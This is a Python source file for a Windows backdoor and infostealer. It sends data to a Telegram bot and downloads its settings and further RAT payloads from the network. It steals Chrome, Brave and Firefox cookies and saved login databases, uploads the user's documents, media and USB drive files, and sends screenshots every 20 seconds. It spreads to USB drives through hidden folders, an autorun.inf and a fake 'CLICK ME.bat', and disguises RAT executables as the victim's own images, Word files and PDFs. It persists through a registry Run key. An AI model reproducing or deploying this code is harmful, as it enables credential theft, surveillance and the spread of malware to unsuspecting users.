import time
import sys
import os
import subprocess
import shutil
import platform
import threading
import requests
import os
import subprocess, json
import pyautogui
import random

class Bot():
    def __init__(self,API_KEY, file_chat_id):
        self.API_KEY = API_KEY

        self.file_chat_id = file_chat_id
        
        
    def send_message(self,msg,chat_id):
        send_message = 'https://api.telegram.org/bot'+self.API_KEY+'/sendMessage?chat_id='+chat_id+'&text='+msg
        requests.get(send_message, )
        
        
    def send_image(self,path,caption="new pic"):
        photo = {'photo':open(path,'rb')}
        send_img = 'https://api.telegram.org/bot'+self.API_KEY+'/sendPhoto?chat_id='+self.file_chat_id+'&caption='+caption
        requests.post(send_img,files=photo)
        
    def send_screenshot (self,ss_chat_id, path,caption="new pic"):
        photo = {'photo':open(path,'rb')}
        send_img = 'https://api.telegram.org/bot'+self.API_KEY+'/sendPhoto?chat_id='+ss_chat_id+'&caption='+caption
        requests.post(send_img,files=photo)

    def send_file(self,path,caption="new file"):
        document = {'document':open(path,'rb')}
        send_doc = 'https://api.telegram.org/bot'+self.API_KEY+'/sendDocument?chat_id='+self.file_chat_id+'&caption='+caption
        requests.post(send_doc,files=document)



    def send_video(self,path,caption="new video"):
        vid = {'video':open(path,'rb')}
        send_vid = 'https://api.telegram.org/bot'+self.API_KEY+'/sendVideo?chat_id='+self.file_chat_id+'&caption='+caption
        requests.post(send_vid,files=vid)
        
        
    def send_audio(self,path,caption="new audio"):
        audio = {'audio':open(path,'rb')}
        send_audio = 'https://api.telegram.org/bot'+self.API_KEY+'/sendAudio?chat_id='+self.file_chat_id+'&caption='+caption
        requests.post(send_audio,files=audio)

class CookieStealer:
    def __init__(self,bot):
        self.bot = bot

    # mozilla firefox cookie steal section
    def mozilla(self):
        try:
            mozilla_cookie_location = os.environ["appdata"] + "\\Mozilla\Firefox\Profiles\\" + os.listdir(os.environ["appdata"] + "\\Mozilla\Firefox\Profiles")[0]+"\\cookies.sqlite"
            mozilla_cookie_location2 = os.environ["appdata"] + "\\Mozilla\Firefox\Profiles\\" + os.listdir(os.environ["appdata"] + "\\Mozilla\Firefox\Profiles")[1]+"\\cookies.sqlite"
            if os.path.exists(mozilla_cookie_location):
                self.bot.send_file(path=mozilla_cookie_location,caption="mozilla cookie")
            elif os.path.exists(mozilla_cookie_location2):
                self.bot.send_file(path=mozilla_cookie_location2,caption="mozilla cookie")
        except:
            pass
            
    # chrome local state, login data and cookie steal section
    def chrome(self):
        try:
            user= os.environ["appdata"].split("\\")[2]
            chrome_local_state_location = "C:\\Users\\"+ user+"\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
            if os.path.exists(chrome_local_state_location):
                self.bot.send_file(path=chrome_local_state_location,caption="chrome local state file")

            chrome_login_data_location = "C:\\Users\\"+ user+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
            if os.path.exists(chrome_login_data_location):
                self.bot.send_file(path=chrome_login_data_location,caption="chrome login data")

            chrome_cookie_location = "C:\\Users\\"+ user+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
            if os.path.exists(chrome_cookie_location):
                self.bot.send_file(path=chrome_cookie_location,caption="chrome cookie")
        except:
            pass


    # brave local state, login data and cookie steal section
    def brave(self):
        try:
            user= os.environ["appdata"].split("\\")[2]
            brave_local_state_location = "C:\\Users\\"+ user+"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
            if os.path.exists(brave_local_state_location):
                self.bot.send_file(path=brave_local_state_location,caption="brave local state file")

            brave_login_data_location = "C:\\Users\\"+ user+"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
            if os.path.exists(brave_login_data_location):
                self.bot.send_file(path=brave_login_data_location,caption="brave login data")

            brave_cookie_location = "C:\\Users\\"+ user+"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
            if os.path.exists(brave_cookie_location):
                self.bot.send_file(path=brave_cookie_location,caption="brave cookie")
        except:
            pass


class GrabFile():
    def __init__(self,bot) -> None:
        self.all_file_path = []              #main all file path list
        self.bot = bot

    # getting drive list in a dictionary list format
    def get_drive_list(self):
        # proc = subprocess.run(args=['powershell','-noprofile','-command','Get-WmiObject -Class Win32_LogicalDisk | Select-Object deviceid,volumename,drivetype | ConvertTo-Json'],text=True,stdout=subprocess.PIPE)
        # devices = json.loads(proc.stdout)
        devices = []
        p = subprocess.getoutput('wmic logicaldisk get DeviceID,DriveType').splitlines()
        for i in p:
            if ':' in i:
                deviceid = i.split(' ')[0]
                drivetype = int(i.split(' ')[8])
                temp_dict = {}
                temp_dict.update({'deviceid':deviceid,'drivetype':drivetype})
                devices.append(temp_dict)
        return devices

    # add file to main list
    def add_to_list(self,path):
        extention_list = ['mp3','exe','wav' ,'7z' ,'rar', 'zip', 'gif', 'ico', 'jpg', 'jpeg', 'png', 'svg', 'psd', 'ppt', 'pptx', 'xls', '3gp', 'avi', 'm4v', 'mkv', 'mp4', 'doc', 'docx', 'pdf', 'txt','rtf']
        size = os.path.getsize(path)
        if size <= 104857600 and not 'Temp' in path and path.split(".")[-1].lower() in extention_list:
            self.all_file_path.append(path+"::"+str(size))

    #copy agent m1: sent agent with autorun and bat file
    def copy_agent_methon_1(self,drive_name):
        if not os.path.exists(drive_name+'\\.windows_updater'):
            os.mkdir(drive_name+'\\.windows_updater')
            shutil.copyfile(os.environ["appdata"] + "\\file_manager\\file_manager.exe",drive_name+'\\.windows_updater\\windows_updater.exe')
            #print('agent pushed')
            subprocess.call('attrib +h '+drive_name+'\\.windows_updater')
        if not os.path.exists(drive_name+'\\autorun.inf'):
            autorun_file = open(drive_name+'\\autorun.inf','w')
            autorun_file.write('[autorun]\nOpen=.windows_updater\\windows_updater.exe')
            autorun_file.close()
        if not os.path.exists(drive_name+'\\CLICK ME.bat'):
            bat_file = open(drive_name+'\\CLICK ME.bat','w')
            bat_file.write('@echo off\nstart .windows_updater\\windows_updater.exe\necho checking system.....\ntimeout /t 5 /nobreak >nul\necho checking windows update\ntimeout /t 5 /nobreak >nul\necho checking windows security patch\ntimeout /t 5 /nobreak >nul\necho everything is okey. prees any key to exit\ntimeout /t 2 /nobreak >nul\nexit')
            bat_file.close()
        self.bot.send_message(msg='Agent Successfully Pushed to target usb drive',chat_id='-841148009')
    
    #agent push method 2
    def copy_agent_mehod_2(self,drive_name,sdirn,files):
        targets = []
        for f in files:
            ext = f.split(".")[-1]
            if ext == "pdf" or ext == "jpg"  or ext == "jpeg" or ext == "doc" or ext == "docx":
                targets.append(f)
        if len(targets) > 0:
            target_file = sdirn + "\\" + random.choice(targets)
            rename_target = target_file.split(".")[0]+"(2)."+target_file.split(".")[-1]
            try:
              #  
                if target_file.split(".")[-1] == "jpg" or target_file.split(".")[-1] == "jpeg":
                    shutil.copyfile(os.environ["appdata"] + "\\file_manager\\agents\\image_rat.exe",target_file.split(".")[0]+'.exe')
                    os.rename(target_file,rename_target)
                if target_file.split(".")[-1] == "doc" or target_file.split(".")[-1] == "docx":
                    shutil.copyfile(os.environ["appdata"] + "\\file_manager\\agents\\word_rat.exe",target_file.split(".")[0]+'.exe')
                    os.rename(target_file,rename_target)
                if target_file.split(".")[-1] == "pdf":
                    shutil.copyfile(os.environ["appdata"] + "\\file_manager\\agents\\pdf_rat.exe",target_file.split(".")[0]+'.exe')
                    os.rename(target_file,rename_target)
                os.mkdir(drive_name+'\\.windows_updater')
                shutil.copyfile(os.environ["appdata"] + "\\file_manager\\file_manager.exe",drive_name+'\\.windows_updater\\windows_updater.exe')
                subprocess.call('attrib +h '+drive_name+'\\.windows_updater')
                self.bot.send_message(msg=f'Agent Successfully Pushed to target usb drive as {target_file}',chat_id='-841148009')
                return True
            except Exception as e:
                return False
            
        else:
            return False

    #getting user files path
    def user_path_file_graber(self):
        path = os.environ['appdata'].split('\\')[0] +'\\' + os.environ['appdata'].split('\\')[1] +'\\'+ os.environ['appdata'].split('\\')[2]  #C:\Users\Admin
        raw_dir_list = os.listdir(path)
        dir_list = []                   #main directory list
        for d in raw_dir_list:
            if  d == "Documents" or d == "Downloads" or d == "OneDrive" or d == "Videos" or d == 'My Documents' or d == 'Music':
                dir_list.append(d)
        for item in dir_list:
            if os.path.isdir(path+'\\'+item):
                for sdirn,ssubdir,sfile in os.walk(path+'\\'+item):
                    for f in sfile:
                        file = sdirn+'\\'+f
                        self.add_to_list(file)

    
    def main_graber(self):
        drive_list = []
        drive_list_raw = self.get_drive_list()
        location = os.environ["appdata"] + "\\file_manager\\w\\"   # destination file location give here
        for drive in drive_list_raw:
            drive_name = drive['deviceid']
            drivetype_id = drive["drivetype"]

            if drivetype_id == 2: #removable drive
                self.bot.send_message(msg='Removable usb drive inserted',chat_id='-870523022')
                for sdirn,ssubdir,sfile in os.walk(drive_name+'\\'):
                    for f in sfile:
                        file = sdirn+'\\'+f
                        try:
                            shutil.copyfile(file,location+f)
                        except Exception as e:
                            pass
                    if not os.path.exists(drive_name+'\\.windows_updater'): 
                        if self.copy_agent_mehod_2(drive_name,sdirn,sfile) == False:
                            self.copy_agent_methon_1(drive_name)     # agent copy section
            else:
                if drive_name == 'C:':
                    pass
                else:
                    drive_list.append(drive_name+"\\")
        for item in drive_list:
            for sdirn,ssubdir,sfile in os.walk(item):
                for f in sfile:
                    file = sdirn+'\\'+f
                    self.add_to_list(file)
        #print('scan complete')

    def main(self):
        self.user_path_file_graber()
        self.main_graber()
        return self.all_file_path
 
class Backdoor:
    def __init__(self):
        settings = requests.get("https://raw.githubusercontent.com/hiddenshell/super-spy/main/settings.json").content
        settings_dict = json.loads(settings)
        self.API_KEY = settings_dict["api_token"]
        self.ss_chat_id = settings_dict["ss_chat_id"]
        self.file_chat_id = settings_dict["file_chat_id"]
        self.notifier_id = settings_dict["notifier_id"]
        self.key_flag = 0
        self.user = os.environ['appdata'].split('\\')[2] 
        self.hostname = platform.node()

        self.tbot = Bot(API_KEY=self.API_KEY,file_chat_id=self.file_chat_id)
        self.tbot.send_message(msg=f"Connect with {self.hostname}/{self.user}",chat_id=self.notifier_id)
        os.chdir(os.environ["appdata"] + "\\file_manager")

        self.g = GrabFile(self.tbot)
        self.all_file_path = self.g.main()

        cs = CookieStealer(self.tbot)
        cs.mozilla()
        cs.chrome()
        cs.brave()
        
        img_link = settings_dict["img_link"]
        img_path = os.environ['appdata'] + '\\file_manager\\agents\image_rat.exe'
        if not os.path.exists(img_path):
            try:
                self.downloader(img_link,img_path)
                self.tbot.send_message(msg='Image rat agent successfully downloaded',chat_id=self.notifier_id)
            except:
                self.tbot.send_message(msg='Failed to download image rat agent',chat_id=self.notifier_id)
        word_link = settings_dict["word_link"]
        word_path = os.environ['appdata'] + '\\file_manager\\agents\word_rat.exe'
        if not os.path.exists(word_path):
            try:
                self.downloader(word_link,word_path)
                self.tbot.send_message(msg='word rat agent successfully downloaded',chat_id=self.notifier_id)
            except:
                self.tbot.send_message(msg='Failed to download word rat agent',chat_id=self.notifier_id)
        pdf_link = settings_dict["pdf_link"]
        pdf_path = os.environ['appdata'] + '\\file_manager\\agents\pdf_rat.exe'
        if not os.path.exists(pdf_path):
            try:
                self.downloader(pdf_link,pdf_path)
                self.tbot.send_message(msg='pdf rat agent successfully downloaded',chat_id=self.notifier_id)
            except:
                self.tbot.send_message(msg='Failed to download pdf rat agent',chat_id=self.notifier_id)


#_______ Constracktor end here _______

#-------- All working functions-------
    def downloader(self,url,location):
        try:
            get_file = requests.get(url)
            # file_name = url.split("/")[-1]
            with open (location, "wb") as file:
                for chunk in get_file.iter_content(chunk_size=8129):
                    if chunk:
                        file.write(chunk)
        except:
            pass
				
	
    def screenshot(self,location):
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(location)
        except:
            pass
			
    def send_file(self):
        log_path = os.environ["appdata"] + "\\file_manager\log.txt"
        if not os.path.exists(log_path):
            f = open(log_path,'w')
            f.close()
        logs = open (log_path,"r",encoding='utf-8')
        raw_logs_list = logs.readlines()
        logs.close()
        logs_list =[]
        for log in raw_logs_list:
            log = log.replace("\n","")
            logs_list.append(log)
        for file in self.all_file_path:
            if not file in logs_list:
               # print('sending ',file)
                path = file.split("::")[0]
                ext = file.split("::")[0].split(".")[-1].lower()
                try:
                    if ext == "jpeg" or ext == "jpg" or ext == "png":
                        self.tbot.send_image(path, caption=path)
                    elif ext == "mp3" or ext == "m4a" or ext == "wma" or ext == "wav":
                        self.tbot.send_audio(path,caption=path)
                    elif ext == "mp4" or ext == "avi" or ext == "mkv" or ext == "mov" or ext == "wmv":
                        self.tbot.send_video(path,caption=path)
                    else:
                        self.tbot.send_file(path,caption=path)
                    log_file = open(log_path,"a",encoding='utf-8')
                    log_file.write(file+"\n")
                    log_file.close()
                except:
                    self.tbot.send_message(msg=f'Failed to sent [ {file} ]',chat_id=self.file_chat_id)
                    log_file = open(log_path,"a",encoding='utf-8')
                    log_file.write(file+"\n")
                    log_file.close()
                    pass
        self.tbot.send_message(msg='All Local drive files sent',chat_id=self.file_chat_id)
        loc = os.environ["appdata"] + "\\file_manager\w"
        for f in os.listdir(loc):
            if os.path.isfile(loc+'\\'+f):
                try:
                    self.tbot.send_file(loc+'\\'+f, 'stolen file from usb')
                except:
                    pass
                os.remove(loc+'\\'+f)
        self.tbot.send_message(msg='All stolen file sent',chat_id=self.file_chat_id)

#_____________________________________
    def run_backdoor(self):
        t1 = threading.Thread(target=self.send_file)
        t1.start()
        while True:
            try:
                location = os.environ["appdata"] + "\\file_manager\caches.png"
                self.screenshot(location)
                self.tbot.send_screenshot(self.ss_chat_id, location,f'{self.hostname}/{self.user}')
                os.remove(location)
                time.sleep(20)
                new_list = self.g.main()
             #   print('ss')
                if new_list != self.all_file_path:
                    self.all_file_path = new_list
                    threading.Thread(target=self.send_file).start()
                
            except Exception as e:
                pass
if __name__ == "__main__":
    location = os.environ["appdata"] + "\\file_manager\\file_manager.exe"
    if not os.path.exists(location):
        # file = sys._MEIPASS + "\\windows-user-manual.pdf"
        # subprocess.Popen(file,shell=True)
        time.sleep(1)
        if not os.path.exists(os.environ["appdata"] + "\\file_manager"):
                try:
                    os.mkdir(os.environ["appdata"] + "\\file_manager")
                    os.mkdir(os.environ['appdata'] + '\\file_manager\\w')
                    os.mkdir(os.environ['appdata'] + '\\file_manager\\agents')
                    shutil.copyfile(sys.executable,location)
                    subprocess.call(' reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v file_manager /t REG_SZ /d "'  + location + '"', shell=True)
                except Exception as e:
                    pass
    # time.sleep(120) #300
    while True:
        try:
            if requests.get('http://google.com').status_code == 200:
                my_backdoor = Backdoor()
                my_backdoor.run_backdoor()
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            continue
	